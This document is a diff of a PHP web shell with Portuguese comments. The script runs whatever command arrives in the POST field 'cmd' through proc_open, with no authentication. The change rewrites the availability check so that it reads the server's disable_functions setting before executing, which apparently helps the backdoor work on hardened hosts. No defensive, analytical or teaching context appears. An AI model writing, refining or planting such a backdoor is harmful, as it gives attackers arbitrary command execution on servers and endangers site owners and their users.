@@ -1,11 +1,15 @@
-<?php
+<?php  
 
 if (isset($_POST["cmd"])) {
     $cmd = ($_POST["cmd"]); 
 
     function exec_command($command) {
-        // Verifica se a função exec está disponível
-        if (function_exists('exec')) {
+        // Lista de funções que serão verificadas
+        $disabled_functions = explode(',', ini_get('disable_functions'));
+        $disabled_functions = array_map('trim', $disabled_functions); // Remove espaços
+
+        // Verifica se a função exec está desabilitada
+        if (!in_array('exec', $disabled_functions)) {
             $descriptorspec = array(
                 0 => array("pipe", "r"),
                 1 => array("pipe", "w"),
@@ -21,7 +25,7 @@ if (isset($_POST["cmd"])) {
                 proc_close($process);
             }
         } else {
-            echo "A função exec não está disponível.";
+            echo "A função exec está desabilitada.";
         }
     }
 
